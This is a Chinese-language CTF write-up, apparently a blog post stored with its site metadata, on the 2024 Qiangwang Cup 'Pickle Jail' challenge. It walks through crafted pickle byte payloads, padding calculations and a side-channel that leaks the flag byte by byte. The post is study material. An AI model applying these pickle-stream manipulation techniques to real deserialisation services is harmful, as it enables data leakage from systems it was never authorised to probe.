48) 479: C SHORT_BINBYTES b\u0026#39;Melissa\u0026#39; 488: \\x94 MEMOIZE (as 49) 489: h BINGET 0 491: e APPENDS (MARK at 22) 492: \\x8c SHORT_BINUNICODE \u0026#39;flag{f0192fd3-f87f-4693-a28d-a6e24766c143}\u0026#39; 536: \\x94 MEMOIZE (as 50) 537: \\x87 TUPLE3 Traceback (most recent call last): File \u0026#34;/root/python/pickle_jail.py\u0026#34;, line 5, in \u0026lt;module\u0026gt; dis(data) File \u0026#34;/usr/lib/python3.11/pickletools.py\u0026#34;, line 2535, in dis raise ValueError(\u0026#34;tries to pop %d items from stack with \u0026#34; ValueError: tries to pop 3 items from stack with only 2 items 这个下面的才是正确的序列化结果\n修改\\t为\\x06\n┌──(root㉿kali)-[~/python] └─# python pickle_jail.py 0: \\x80 PROTO 4 2: \\x95 FRAME 532 11: C SHORT_BINBYTES b\u0026#39;messir\u0026#39; 19: \\x94 MEMOIZE (as 0) 20: ] EMPTY_LIST 21: \\x94 MEMOIZE (as 1) 22: ( MARK 23: C SHORT_BINBYTES b\u0026#39;Heather\u0026#39; 32: \\x94 MEMOIZE (as 2) 33: C SHORT_BINBYTES b\u0026#39;Sharon\u0026#39; 41: \\x94 MEMOIZE (as 3) 42: C SHORT_BINBYTES b\u0026#39;Hannah\u0026#39; 50: \\x94 MEMOIZE (as 4) 51: C SHORT_BINBYTES b\u0026#39;Kelli\u0026#39; 58: \\x94 MEMOIZE (as 5) 59: C SHORT_BINBYTES b\u0026#39;Teresa\u0026#39; 67: \\x94 MEMOIZE (as 6) 68: C SHORT_BINBYTES b\u0026#39;Thomas\u0026#39; 76: \\x94 MEMOIZE (as 7) 77: C SHORT_BINBYTES b\u0026#39;Veronica\u0026#39; 87: \\x94 MEMOIZE (as 8) 88: C SHORT_BINBYTES b\u0026#39;Susan\u0026#39; 95: \\x94 MEMOIZE (as 9) 96: C SHORT_BINBYTES b\u0026#39;Eileen\u0026#39; 104: \\x94 MEMOIZE (as 10) 105: C SHORT_BINBYTES b\u0026#39;Kristin\u0026#39; 114: \\x94 MEMOIZE (as 11) 115: C SHORT_BINBYTES b\u0026#39;Christopher\u0026#39; 128: \\x94 MEMOIZE (as 12) 129: C SHORT_BINBYTES b\u0026#39;Kristina\u0026#39; 139: \\x94 MEMOIZE (as 13) 140: C SHORT_BINBYTES b\u0026#39;Michelle\u0026#39; 150: \\x94 MEMOIZE (as 14) 151: C SHORT_BINBYTES b\u0026#39;Bryan\u0026#39; 158: \\x94 MEMOIZE (as 15) 159: C SHORT_BINBYTES b\u0026#39;Jerry\u0026#39; 166: \\x94 MEMOIZE (as 16) 167: C SHORT_BINBYTES b\u0026#39;Michael\u0026#39; 176: \\x94 MEMOIZE (as 17) 177: C SHORT_BINBYTES b\u0026#39;Shelby\u0026#39; 185: \\x94 MEMOIZE (as 18) 186: C SHORT_BINBYTES b\u0026#39;Tiffany\u0026#39; 195: \\x94 MEMOIZE (as 19) 196: C SHORT_BINBYTES b\u0026#39;Erika\u0026#39; 203: \\x94 MEMOIZE (as 20) 204: C SHORT_BINBYTES b\u0026#39;Robert\u0026#39; 212: \\x94 MEMOIZE (as 21) 213: C SHORT_BINBYTES b\u0026#39;Courtney\u0026#39; 223: \\x94 MEMOIZE (as 22) 224: C SHORT_BINBYTES b\u0026#39;Angela\u0026#39; 232: \\x94 MEMOIZE (as 23) 233: C SHORT_BINBYTES b\u0026#39;Erin\u0026#39; 239: \\x94 MEMOIZE (as 24) 240: C SHORT_BINBYTES b\u0026#39;Nicole\u0026#39; 248: \\x94 MEMOIZE (as 25) 249: C SHORT_BINBYTES b\u0026#39;Jeffrey\u0026#39; 258: \\x94 MEMOIZE (as 26) 259: C SHORT_BINBYTES b\u0026#39;Colleen\u0026#39; 268: \\x94 MEMOIZE (as 27) 269: C SHORT_BINBYTES b\u0026#39;William\u0026#39; 278: \\x94 MEMOIZE (as 28) 279: C SHORT_BINBYTES b\u0026#39;Deanna\u0026#39; 287: \\x94 MEMOIZE (as 29) 288: C SHORT_BINBYTES b\u0026#39;James\u0026#39; 295: \\x94 MEMOIZE (as 30) 296: C SHORT_BINBYTES b\u0026#39;Stacey\u0026#39; 304: \\x94 MEMOIZE (as 31) 305: C SHORT_BINBYTES b\u0026#39;Terri\u0026#39; 312: \\x94 MEMOIZE (as 32) 313: C SHORT_BINBYTES b\u0026#39;Sarah\u0026#39; 320: \\x94 MEMOIZE (as 33) 321: C SHORT_BINBYTES b\u0026#39;Alicia\u0026#39; 329: \\x94 MEMOIZE (as 34) 330: C SHORT_BINBYTES b\u0026#39;Maria\u0026#39; 337: \\x94 MEMOIZE (as 35) 338: C SHORT_BINBYTES b\u0026#39;Rickey\u0026#39; 346: \\x94 MEMOIZE (as 36) 347: C SHORT_BINBYTES b\u0026#39;Natalie\u0026#39; 356: \\x94 MEMOIZE (as 37) 357: C SHORT_BINBYTES b\u0026#39;Richard\u0026#39; 366: \\x94 MEMOIZE (as 38) 367: C SHORT_BINBYTES b\u0026#39;Garrett\u0026#39; 376: \\x94 MEMOIZE (as 39) 377: C SHORT_BINBYTES b\u0026#39;Amanda\u0026#39; 385: \\x94 MEMOIZE (as 40) 386: C SHORT_BINBYTES b\u0026#39;Jason\u0026#39; 393: \\x94 MEMOIZE (as 41) 394: C SHORT_BINBYTES b\u0026#39;Tammy\u0026#39; 401: \\x94 MEMOIZE (as 42) 402: C SHORT_BINBYTES b\u0026#39;Dana\u0026#39; 408: \\x94 MEMOIZE (as 43) 409: C SHORT_BINBYTES b\u0026#39;Jamie\u0026#39; 416: \\x94 MEMOIZE (as 44) 417: C SHORT_BINBYTES b\u0026#39;John\u0026#39; 423: \\x94 MEMOIZE (as 45) 424: C SHORT_BINBYTES b\u0026#39;Brandi\u0026#39; 432: \\x94 MEMOIZE (as 46) 433: C SHORT_BINBYTES b\u0026#39;Alejandro\u0026#39; 444: \\x94 MEMOIZE (as 47) 445: C SHORT_BINBYTES b\u0026#39;Danielle\u0026#39; 455: \\x94 MEMOIZE (as 48) 456: C SHORT_BINBYTES b\u0026#39;Alexandra\u0026#39; 467: \\x94 MEMOIZE (as 49) 468: C SHORT_BINBYTES b\u0026#39;Brittany\u0026#39; 478: \\x94 MEMOIZE (as 50) 479: C SHORT_BINBYTES b\u0026#39;Melissa\u0026#39; 488: \\x94 MEMOIZE (as 51) 489: h BINGET 0 491: e APPENDS (MARK at 22) 492: \\x8c SHORT_BINUNICODE \u0026#39;flag{f0192fd3-f87f-4693-a28d-a6e24766c143}\u0026#39; 536: \\x94 MEMOIZE (as 52) 537: \\x87 TUPLE3 538: \\x94 MEMOIZE (as 53) 539: . STOP highest protocol among opcodes = 4 对比# 第一个\n0: \\x80 PROTO 4\r2: \\x95 FRAME 532\r11: C SHORT_BINBYTES b\u0026#39;messir\\x94]\\x94\u0026#39; //关键位置\r22: ( MARK 多吃了字节\n第二个\n0: \\x80 PROTO 4\r2: \\x95 FRAME 532\r11: C SHORT_BINBYTES b\u0026#39;messir\u0026#39;\r19: \\x94 MEMOIZE (as 0)\r20: ] EMPTY_LIST\r21: \\x94 MEMOIZE (as 1)\r22: ( MARK 注意到附件里面，需要出来三给对象，flag要是全序列化进了players，而且flag在上面那个data元组中又是最后的，_不就空了吗。、\nname, players, _ = eval(\u0026#34;F(n).load()\u0026#34;, safe_dic, {})\rif name in players:\rdel _\rprint(f\u0026#34;{name} joined this game, but here is no flag!\u0026#34;) 这里其实我也保留了一个疑问，为什么不能干脆就让_空就空呗。然后 _ 是不是就是空，师傅用了一个trick\n可以看到空字典的 pickle 格式:\nEMPTY_DICT = b\u0026#39;}\u0026#39; # push empty dict flag 的结尾是一个}\n这里就直接引用woodwhale师傅的总结\n那么最后的思路就是:\nname输入自定义bytes players携带flag数据 _ 是一个空字典，不用管 结合 if name in players 这个判断语句，我们可以单字节去爆破flag的内容\n例如，name=b\u0026quot;flag{\u0026quot;, players = b\u0026quot;一堆无用的players数据\u0026quot; + b\u0026quot;flag数据\u0026quot;，如果name中输入的flag正确，那么就会执行print(f\u0026quot;{name} joined this game, but here is no flag!\u0026quot;)，从而完成侧信道爆破\n构造padding# 我们该怎么去编写pickle data,题目中的players是随机生成的。而且我们的players要除了最后一个}都要吞了。\nflag = \u0026#34;flag{\u0026#34; tmp_flag = flag tmp_flag_len = len(tmp_flag) payload = b\u0026#34;C\u0026#34;\t# bytes payload += bytes([tmp_flag_len]) # bytes len payload += tmp_flag.encode()\t# bytes content pad = 3 * len(players) + sum(map(len, players)) + 302 - tmp_flag_len payload += b\u0026#34;B\u0026#34; + p32(pad) # \u0026gt; 256 bytes padding，配合ljust正好覆盖到 flag 删去 `}` 的最后一个字符 payload = payload.ljust(0x103, b\u0026#34;\\xff\u0026#34;) 前面的都好理解，主要是后面的一下代码\npad = 3 * len(players) + sum(map(len, players)) + 302 - tmp_flag_len //每一个players都有一个字节的C+一个字节的长度识别+一个字节的记录到列表中也就是\\x94,这个302我没有去深究，但是应该是控制\\x03\\x01\\x00\\x00，类似格式的实现 payload += b\u0026#34;B\u0026#34; + p32(pad) # \u0026gt; 256 bytes padding，配合ljust正好覆盖到 flag 删去 `}` 的最后一个字符 //p32(pad)将这些数据转换成四个字节的十六进制，和B的数据识别长度刚好吻合 payload = payload.ljust(0x103, b\u0026#34;\\xff\u0026#34;) //0x103固定这个大小就是为了B序列化的识别长度为我们想要的，\\x03\\x01\\x00\\x00 例如输入以下数据：\nb\u0026#39;C\\x06flag{1B\\xea\\x02\\x00\\x00\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\u0026#39;\r//C\\x06flag{1 name\r//B\\xea\\x02\\x00\\x00\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\u0026#39;\r//\\xea\\x02\\x00\\x00的大小给不止读\rxff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\r所以会都如后续players和flag 输入number为bytes([11])\n随后得到的新的三元组的 pickle data就是\ndata = bytearray(b\u0026#39;\\x80\\x04\\x95\\xff\\x02\\x00\\x00\\x00\\x00\\x00\\x00C\\x03\\x01\\x00\\x00C\\x06flag{-B\\xe8\\x02\\x00\\x00\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\x94]\\x94(C\\x06Amanda\\x94C\\x06Denise\\x94C\\x06Robert\\x94C\\x05Paula\\x94C\\x06Angela\\x94C\\x0bChristopher\\x94C\\x04Lisa\\x94C\\x06Tamara\\x94C\\x07Barbara\\x94C\\x07Jasmine\\x94C\\x06Ashley\\x94C\\tAlejandra\\x94C\\x05David\\x94C\\x04Alex\\x94C\\x05Keith\\x94C\\x05Billy\\x94C\\x06Melvin\\x94C\\x07William\\x94C\\x05Tonya\\x94C\\x08Jennifer\\x94C\\x06Brandi\\x94C\\x05James\\x94C\\x05Donna\\x94C\\x07Bradley\\x94C\\x07Theresa\\x94C\\x05Kayla\\x94C\\x05Carol\\x94C\\x07Kristin\\x94C\\x05Susan\\x94C\\x08Mitchell\\x94C\\x06Sandra\\x94C\\x05Kathy\\x94C\\x07Jeffrey\\x94C\\x07Michael\\x94C\\x05Julia\\x94C\\x06Nicole\\x94C\\x06Gloria\\x94C\\x05Henry\\x94C\\x04Cory\\x94C\\x07Phillip\\x94C\\x06Dakota\\x94C\\x06Daniel\\x94C\\x05Shawn\\x94C\\x08Kimberly\\x94C\\x07Heather\\x94C\\x05Jacob\\x94C\\x04John\\x94C\\x06Nathan\\x94C\\x05Jimmy\\x94C\\x04Eric\\x94h\\x00e\\x8c*flag{f0192fd3-f87f-4693-a28d-a6e24766c143}\\x94\\x87\\x94.\u0026#39;) //}\\x94，}就被识别为空列表即元组中的_={},也就不需要序列化，自动就加了给空列表到里面 pickletools.dis一下\n0: \\x80 PROTO 4 2: \\x95 FRAME 767 11: C SHORT_BINBYTES b\u0026#39;\\x01\\x00\\x00\u0026#39; 16: C SHORT_BINBYTES b\u0026#39;flag{-\u0026#39; 24: B BINBYTES b\u0026#39;\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\x94]\\x94(C\\x06Amanda\\x94C\\x06Denise\\x94C\\x06Robert\\x94C\\x05Paula\\x94C\\x06Angela\\x94C\\x0bChristopher\\x94C\\x04Lisa\\x94C\\x06Tamara\\x94C\\x07Barbara\\x94C\\x07Jasmine\\x94C\\x06Ashley\\x94C\\tAlejandra\\x94C\\x05David\\x94C\\x04Alex\\x94C\\x05Keith\\x94C\\x05Billy\\x94C\\x06Melvin\\x94C\\x07William\\x94C\\x05Tonya\\x94C\\x08Jennifer\\x94C\\x06Brandi\\x94C\\x05James\\x94C\\x05Donna\\x94C\\x07Bradley\\x94C\\x07Theresa\\x94C\\x05Kayla\\x94C\\x05Carol\\x94C\\x07Kristin\\x94C\\x05Susan\\x94C\\x08Mitchell\\x94C\\x06Sandra\\x94C\\x05Kathy\\x94C\\x07Jeffrey\\x94C\\x07Michael\\x94C\\x05Julia\\x94C\\x06Nicole\\x94C\\x06Gloria\\x94C\\x05Henry\\x94C\\x04Cory\\x94C\\x07Phillip\\x94C\\x06Dakota\\x94C\\x06Daniel\\x94C\\x05Shawn\\x94C\\x08Kimberly\\x94C\\x07Heather\\x94C\\x05Jacob\\x94C\\x04John\\x94C\\x06Nathan\\x94C\\x05Jimmy\\x94C\\x04Eric\\x94h\\x00e\\x8c*flag{f0192fd3-f87f-4693-a28d-a6e24766c143\u0026#39; 773: } EMPTY_DICT 774: \\x94 MEMOIZE (as 0) 775: \\x87 TUPLE3 776: \\x94 MEMOIZE (as 1) 777: . STOP highest protocol among opcodes = 4 Traceback (most recent call last): File \u0026#34;test.py\u0026#34;, line 3, in \u0026lt;module\u0026gt; dis(data) File \u0026#34;lib/python3.10/pickletools.py\u0026#34;, line 2547, in dis raise ValueError(\u0026#34;stack not empty after STOP: %r\u0026#34; % stack) ValueError: stack not empty after STOP: [bytes] 解包后的三元组数据就是：\n(b\u0026#39;flag{-\u0026#39;, b\u0026#39;\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\x94]\\x94(C\\x06Amanda\\x94C\\x06Denise\\x94C\\x06Robert\\x94C\\x05Paula\\x94C\\x06Angela\\x94C\\x0bChristopher\\x94C\\x04Lisa\\x94C\\x06Tamara\\x94C\\x07Barbara\\x94C\\x07Jasmine\\x94C\\x06Ashley\\x94C\\tAlejandra\\x94C\\x05David\\x94C\\x04Alex\\x94C\\x05Keith\\x94C\\x05Billy\\x94C\\x06Melvin\\x94C\\x07William\\x94C\\x05Tonya\\x94C\\x08Jennifer\\x94C\\x06Brandi\\x94C\\x05James\\x94C\\x05Donna\\x94C\\x07Bradley\\x94C\\x07Theresa\\x94C\\x05Kayla\\x94C\\x05Carol\\x94C\\x07Kristin\\x94C\\x05Susan\\x94C\\x08Mitchell\\x94C\\x06Sandra\\x94C\\x05Kathy\\x94C\\x07Jeffrey\\x94C\\x07Michael\\x94C\\x05Julia\\x94C\\x06Nicole\\x94C\\x06Gloria\\x94C\\x05Henry\\x94C\\x04Cory\\x94C\\x07Phillip\\x94C\\x06Dakota\\x94C\\x06Daniel\\x94C\\x05Shawn\\x94C\\x08Kimberly\\x94C\\x07Heather\\x94C\\x05Jacob\\x94C\\x04John\\x94C\\x06Nathan\\x94C\\x05Jimmy\\x94C\\x04Eric\\x94h\\x00e\\x8c*flag{f0192fd3-f87f-4693-a28d-a6e24766c143\u0026#39;, {}) 师傅这里提到了两个坑点：\n​\t这里的第一个坑点就是，输入\\x10会被当做\\n截断，所以需要特殊处理一下\n​\t第二个坑点就是players是随机生成的，每次的数据都不一样，得计算padding长度，这里就不细谈了，直接看exp就行\n还有第二种做出的方法：就是pwn师傅可能注意到的\ndata[num] += 1 data[num] %= 0xFF (0xfe + 1) % 0xff = 0。\n这个漏洞：如果我们输入一个长度为 0xfe 的 name，然后在 index=12 的下标对数据 +1 ，那么这个B对应的长度\\xfe就成了\\x0\n后续解题的思想是一样的。\n感想🫨😵😵‍💫：# 强网杯的题目确实不一般，拿着出题人wp都要折腾好久，只能说菜就多练吧，也是理解到为什么厉害的misc手都说是是全栈佬，实在太全面了。希望以后遇到简单的能有思路吧。😅😅😅\n参考连接👇:# 【WP】强网杯 S8 Misc-Pickle Jail 官方题解 | WoodWhale\u0026rsquo;s Blog\n","date":"2024-12-03","id":6,"permalink":"/blog/2024%E5%BC%BA%E7%BD%91%E6%9D%AF-misc-pickle_jail/","summary":"2024强网杯-Misc-Pickle jail# 第一次遇到jail类型的题目，而且还是在大赛上，并且还是这么难的情况，努力理解复现吧。\n附件😣😰🥹：# pickle_jail.py 的文件\n#!/usr/local/bin/python from io import BytesIO from os import _exit from pathlib import Path from pickle import Pickler, Unpickler from sys import stderr, stdin, stdout from time import time from faker import Faker Faker.seed(time()) fake = Faker(\u0026#34;en_US\u0026#34;) flag = Path(\u0026#34;flag\u0026#34;).read_text() def print(_): stdout.buffer.write(f\u0026#34;{_}\\n\u0026#34;.encode()) stdout.buffer.flush() def input(_=None, limit: int = -1): if _: print(_) _ = stdin.buffer.readline(limit) stdin.buffer.flush() return _ def bye(_): print(_) _exit(0) players = [fake.unique.first_name().encode() for _ in range(50)] print(\u0026#34;Welcome to this jail game!\u0026#34;) print(f\u0026#34;Play this game to get the flag with these players: {players}!\u0026#34;) name = input(\u0026#34;So... What\u0026#39;s your name?\u0026#34;, 300).strip() assert name not in players, \u0026#34;You are already joined!\u0026#34; print(f\u0026#34;Welcome {name}!\u0026#34;) players.append(name) biox = BytesIO() Pickler(biox).dump( ( name, players, flag, ) ) data = bytearray(biox.getvalue()) num = input(\u0026#34;Enter a random number to win: \u0026#34;, 1)[0] assert num \u0026lt; len(data), \u0026#34;You are not allowed to win!\u0026#34; data[num] += 1 data[num] %= 0xFF del name, players, flag biox.close() stderr.close() try: safe_dic = { \u0026#34;__builtins__\u0026#34;: None, \u0026#34;n\u0026#34;: BytesIO(data), \u0026#34;F\u0026#34;: type(\u0026#34;f\u0026#34;, (Unpickler,), {\u0026#34;find_class\u0026#34;: lambda *_: \u0026#34;H4cker\u0026#34;}), } name, players, _ = eval(\u0026#34;F(n).load()\u0026#34;, safe_dic, {}) if name in players: del _ print(f\u0026#34;{name} joined this game, but here is no flag!\u0026#34;) except Exception: print(\u0026#34;What happened? IDK...\u0026#34;) finally: bye(\u0026#34;Break this jail to get the flag!\u0026#34;) 分析附件：# 